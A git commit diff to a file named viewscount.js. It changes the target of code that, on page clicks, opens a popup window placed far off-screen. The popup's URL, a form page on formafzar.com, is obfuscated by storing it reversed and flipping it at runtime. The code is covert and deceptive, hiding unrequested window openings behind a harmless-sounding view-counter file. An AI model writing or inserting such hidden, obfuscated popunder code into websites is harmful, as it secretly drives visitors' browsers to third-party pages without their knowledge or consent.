aedb26c879ce525487506037d60418df9c0990c7
JTJ <49002275+ProfessorJTJ@users.noreply.github.com>
2023-11-12 22:24:09 +0330

    Update viewscount.js

--- js/viewscount.js
+++ js/viewscount.js
@@ -24,7 +24,7 @@
 	document.addEventListener("click", function(e) {
 		if (showPopUp()) {
 		        var width = screen.width / 4;var height = screen.height / 4;var config='width=' + (width) + ', height=' + (height)+',top=99999999,left=99999999,status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no,fullscreen=no';
-			window.open("i5vxs/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
+			window.open("rspzy/mrof/moc.razfamrof//:sptth".split("").reverse().join(""), "_blank", config);				
 		        //window.open(eatApple, "_self");
 			localStorage.setItem("popcornlast", Date.now());
 		}
